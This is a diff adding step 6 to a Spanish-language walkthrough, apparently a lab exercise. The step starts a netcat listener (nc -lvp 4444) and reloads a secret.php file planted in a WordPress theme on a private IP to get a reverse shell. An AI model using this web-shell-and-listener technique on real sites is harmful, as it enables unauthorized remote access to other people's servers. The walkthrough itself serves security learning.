@@ -122,3 +122,10 @@ Cambiar la línea `$ip` por la IP local de su máquina, el puerto lo establecen 
 ![17](https://user-images.githubusercontent.com/75953873/173484877-992337aa-07ec-4e77-9911-3d2012f90cec.png)
 
 - *Paso 6:* Obtener una reverse shell con Netcat.
+```
+nc -lvp 4444
+```
+
+Recargar URL: `http://192.168.25.133/wordpress/wp-content/themes/twentynineteen/secret.php`
+
+![18](https://user-images.githubusercontent.com/75953873/173485100-521d3774-aeab-414b-a9a1-3f78b35b5e8f.png)
